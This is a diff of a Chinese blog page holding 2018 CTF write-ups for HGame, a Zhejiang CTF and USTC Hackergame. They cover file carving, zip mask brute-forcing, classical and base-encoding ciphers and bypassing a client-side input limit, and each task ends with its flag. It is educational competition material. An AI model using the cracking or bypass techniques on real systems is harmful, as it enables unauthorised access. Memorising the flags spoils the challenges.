+<p><font size="8">0x04</font>Try<br>&emsp;&emsp;下载下来是一个pacpng流量文件，用wireshark打开分析，直接导出一个dec.zip</p>
+<p><img src="https://i.imgur.com/I8FpAkl.png" alt></p>
+<p>&emsp;&emsp;打开两个文件，又一个压缩包还有一个password.txt，打开后是hgame<strong>****</strong>，用一个爆破zip的软件</p>
+<p><img src="https://i.imgur.com/6Ttm29A.png" alt></p>
+<p>&emsp;&emsp;用掩码爆破，得到密码：hgame25839421，解压后得到一个图片</p>
+<p><img src="https://i.imgur.com/9utRnih.jpg" alt></p>
+<p>（真好看）放到winhex看一看</p>
+<p><img src="https://i.imgur.com/ziznhMw.png" alt></p>
+<p>&emsp;&emsp;发现PK头，所以直接改后缀，改成zip后解压，发现解压不了，winrar修复一下，再解压，得到一个1.docx，打开发现没有东西（无字天书呼应233）然后用txt格式打开，又发现PK头，再改成zip，再解压</p>
+<p><img src="https://i.imgur.com/IItlnMf.png" alt></p>
+<p>&emsp;&emsp;发现是一堆xml界面，网上找了一个xml在线解析平台，找到document.xml，跑一下，得到flag：hgame{59d28413e36019861498e823f3f41406}</p>
+<p><img src="https://i.imgur.com/Pzvhtap.png" alt></p>
+<hr>
+<p>CRYPTO<br><font size="8">0x01</font>Mix<br>&emsp;&emsp;看题目描述</p>
+<p>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./</p>
+<p>..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/</p>
+<p>-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/</p>
+<p>-…./…../–…/-.. So easy</p>
+<p>一看就是摩尔斯电码，在线平台解密，得到：744b735f6d6f7944716b7b6251663430657d，这个是16进制代码，</p>
+<p>转成str后是tKs_moyDqk{bQf40e}，这是一个移位的加密，初步锁定再栅栏加密和凯撒密码，多次尝试后，</p>
+<p>是先用密钥为2的栅栏加密，得到一个中间密码：tsmyq{Q4eK_oDkbf0}，</p>
+<p>后面再用密钥为13的凯撒密码，得到flag：hgame{e4sy_crypt0}</p>
+<hr>
+<p><font size="8">0x02</font>Base全家<br>&emsp;&emsp;（不会写脚本手动解密emmmmm）打开后是一长段的txt，用hackbar来decode，base64解密3次后得到一大串数字，再来就是base16，转换三次，再base32解密一次，再用base16，后面又用base32解密，一次base64解密，一次base16，一次base64，四次base16，一次base32，一次base32，3次base64，俩次base58后得到flag：hgame{40ca78cde14458da697066eb4cc7daf6}</p>
+<hr>
+<p><font size="11">End</font></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/10/27/浙江CTF——做题1小时，挂机4小时/">
+                浙江CTF——做题1小时，挂机4小时
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-10-27</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="浙江CTF省赛"><a href="#浙江CTF省赛" class="headerlink" title="浙江CTF省赛"></a>浙江CTF省赛</h2><p>今天参加了浙江省CTF预赛省赛…但是只做出来了一到misc，就写在这吧<img src="https://i.imgur.com/BaAbS36.jpg" alt></p>
+<p>首先点开题目地址事一个二维码</p>
+<p><img src="https://i.imgur.com/J5fsjTq.png" alt></p>
+<p>手机扫一下发现并没什么卵用</p>
+<p><img src="https://i.imgur.com/wha3fnW.jpg" alt></p>
+<p>那就丢Linux然后binwalk一下吧，结果发现…</p>
+<p><img src="https://i.imgur.com/uxm4wDi.png" alt></p>
+<p>图片里有个zip文件，所以我们就foremost分离他们，得到一个zip文件<br><img src="https://i.imgur.com/PXmrZvp.png" alt></p>
+<p>结果这个zip文件是坏的…根本打不开，所以我们用WinRAR修复之后解压，得到一个excel文件，但是打开是一堆乱码，我们就转成txt来看</p>
+<p><img src="https://i.imgur.com/YSiJLYY.png" alt></p>
+<p><img src="https://i.imgur.com/tSe5jgn.png" alt></p>
+<p>然后点击编辑里的查找，搜索zjctf（有点偷鸡）<br>找到一段<img src="https://i.imgur.com/x3gdHBX.png" alt><br>看了看后面的flag：zjctf{GFDGFA_GGDFFXXFFA_GGADXG_DFDGDGFAFA_GGDFFXXF}<br>，发现只有几个种类的大写字母，百度查了查这几个字母，发现有种加密算法<br><img src="https://i.imgur.com/epyxx6M.png" alt></p>
+<p>手动解密一下得zjctf{czq_uoneq_utw_ozzqq_uone}</p>
+<hr>
+<p>下次我尽量不水misc了1551，争取把pwn做一道出来</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/10/15/菜鸡初体验——中科大HGame/">
+                菜鸡初体验——中科大HGame
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-10-15</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <font face="微软雅黑">
+什么是菜鮆？我就是！1551
+-----
+0x01 签到题（对，菜到只能写写签到题的wp）
+=====
+<font size="3">
+**打开网页**
+>https://hack.lug.ustc.edu.cn/
+
+<p><strong>注册登陆，打开第一道题</strong><br><img src="https://i.imgur.com/4S0rqxR.png" alt></p>
+<p><strong>所以我们输入hackergame2018（然后眉头一皱发现事情并不是那么简单</strong><br><img src="https://i.imgur.com/bpzFJ0h.png" alt></p>
+<p><strong>网页里限制了我们只能输入13个字符，但是要提交的是14个字符</strong><br><img src="https://i.imgur.com/ZDnUFr1.png" alt></p>
+<p><strong>然后直接修改提交，搞定获得flag</strong><br><img src="https://i.imgur.com/CuUtex2.png" alt></p>
+<hr>
+<h1 id="0x02-这是一个社工题？"><a href="#0x02-这是一个社工题？" class="headerlink" title="0x02 这是一个社工题？"></a>0x02 这是一个社工题？</h1><font size="3">
+**打开第二题，发现是一次知识竞赛？？？**
+![](https://i.imgur.com/qkFOPMh.png)
+**然而根本不是（考不上）中科大的我又怎么知道这些题呢？，所以，我找来了我的好朋友百度与Google，一个个慢慢找答对了就可以得到flag**
+****
+0x03 拼图游戏
+===
+<font size="3">
+**没有任何诈骗,下载下来zip后解压拼图**
+![](https://i.imgur.com/nZXKpK2.png)
+拼图后。。。
+
+<p>——&gt;</p>
+<p><img src="https://i.imgur.com/oha6SIg.png" alt></p>
+<p>稍微读一下就是flag{H4PPY_1M4GE_PR0CE551NG}</p>
+<hr>
+<p>后面就没有了。。。。我会努力坐坐pwn题的。。1551</p>
+</font></font></font></font>
         </div>
     
 
@@ -190,6 +975,19 @@
 </div>
 
 
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
 
 
 
@@ -214,7 +1012,19 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/hello-world/">Hello World</a>
+                <a class="footer-post" href="/2019/08/19/第十二届全国大学生信息安全竞赛创新实践能力赛/">第12届全国大学生信息安全竞赛</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/07/15/CyberCTF-misc-crypto/">CyberCTF——第一次出题</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/05/15/ISCC-Misc/">第16届(2019)全国大学生信息安全与对抗技术竞</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/30/第二届嘉韦思杯/">第二届嘉韦思杯——我菜爆了</a>
             </li>
             
         </ul>
